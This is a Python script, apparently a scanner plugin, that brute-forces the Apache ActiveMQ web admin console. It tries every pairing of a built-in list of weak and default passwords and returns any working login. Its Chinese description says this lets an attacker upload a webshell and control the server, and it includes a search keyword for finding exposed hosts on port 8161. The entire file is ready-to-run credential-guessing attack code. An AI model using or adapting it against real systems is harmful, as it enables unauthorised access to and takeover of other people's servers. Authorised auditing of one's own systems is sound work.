#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

def get_plugin_info():
    plugin_info = {
        "name": "ActiveMQ 弱口令",
        "desc": "攻击者通过此漏洞可直接上传webshell，进而入侵控制服务器。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:ActiveMQ port:8161",
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    user_list = ['admin','s3cret','password','p@ssw0rd','1qaz2wsx', 'root', 'activemq', 'ActiveMQ']
    passwd_list = user_list
    error_i=0
    for user in user_list:
        for passwd in passwd_list:
            try:
                r = requests.get(
                    url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/admin', auth=(user,passwd), timeout=timeout)
            except requests.exceptions.ConnectionError:
                return
            except requests.HTTPError:
                return
            except:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            if "Console" in r.text:
                return f'{arg}\t{user}/{passwd}'
    return False

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
